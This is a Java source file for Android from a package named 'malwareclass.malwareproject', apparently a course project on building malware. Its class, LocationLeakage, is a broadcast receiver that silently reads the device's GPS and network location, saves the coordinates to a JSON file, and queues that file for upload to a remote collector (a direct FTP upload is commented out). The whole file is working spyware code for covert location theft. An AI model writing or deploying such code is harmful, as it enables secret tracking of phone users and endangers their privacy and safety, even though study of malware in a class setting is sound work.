package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.text.SimpleDateFormat;
import java.util.Date;


public class LocationLeakage extends BroadcastReceiver {

    private static final String TAG = "LOCATION";
    private double altitude = 0.0;
    private double longitude = 0.0;
    private double latitude = 0.0;


    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Started");

        AppLocationService appLocationService = new AppLocationService(context);
        Location GPSlocation = appLocationService.getLocation(LocationManager.GPS_PROVIDER);
        if(GPSlocation != null){
            latitude = GPSlocation.getLatitude();
            longitude = GPSlocation.getLongitude();
            altitude = GPSlocation.getAltitude();
        }
        Location NWKlocation = appLocationService.getLocation(LocationManager.NETWORK_PROVIDER);
        if(NWKlocation != null){
            latitude = NWKlocation.getLatitude();
            longitude = NWKlocation.getLongitude();
            altitude = NWKlocation.getAltitude();
        }

        JSONObject location = new JSONObject();
        try {
            location.put("latitude", latitude);
            location.put("longitude", longitude);
            location.put("altitude", altitude);
        } catch (JSONException e) {
            Log.e(TAG, "Error saving location's data in Json format");
        }

        // save JsonArr to File
        Writer output = null;
        String pathname = "location" + new SimpleDateFormat("yyyy.MM.dd-HH.mm.ss").format(new Date()) + ".json";
        File file = new File(context.getCacheDir(), pathname);
        try {
            output = new BufferedWriter(new FileWriter(file));
            output.write(location.toString());
            output.close();
            File[] files = new File[1];
            files[0] = file;

            //new FTP(context).upload(files, "locations");
            if(UploadData.getIstance(context).addFile("locations", files))
                Log.d(TAG, "Location data added!");

        } catch (IOException e) {
            Log.e(TAG, "Error converting Json to File");
        }

        //Log.d(TAG, "latitude " + Double.toString(latitude) + " longitude " + Double.toString(longitude) + " altitude " + Double.toString(altitude));
        //Log.d(TAG, "Ended");
    }

}
